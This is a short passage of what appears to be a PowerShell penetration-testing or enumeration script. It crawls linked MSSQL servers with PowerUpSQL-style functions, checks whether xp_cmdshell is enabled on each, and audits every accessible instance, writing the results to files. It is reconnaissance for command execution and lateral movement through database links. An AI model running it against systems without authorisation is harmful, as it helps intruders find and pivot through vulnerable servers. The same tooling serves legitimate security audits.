        Write-Output "`r`n[+] Instance: $Instance"

        Get-SQLServerLinkCrawl -Instance $Instance -Query "SELECT CONVERT(INT, ISNULL(value, value_in_use)) AS 'is_XpCmdShell' FROM master.sys.configurations WHERE name like '%cmd%';" |
 select Version,Instance,Sysadmin,User -ExpandProperty CustomQuery | Output-Results -Path "$EnumMSSQLDir\$Instance\linked_servers_xpcmdshell_enabled" -Tee
}

Write-Banner -Text "Auditing each accessible MSSQL Instances"
foreach($Instance in $AccessibleInstances){ 
        Write-Output "`r`n[+] Instance: $Instance"

        Invoke-SQLAudit -Instance $Instance | Output-Results -Path "$EnumMSSQLDir\$Instance\audit" -Tee
}
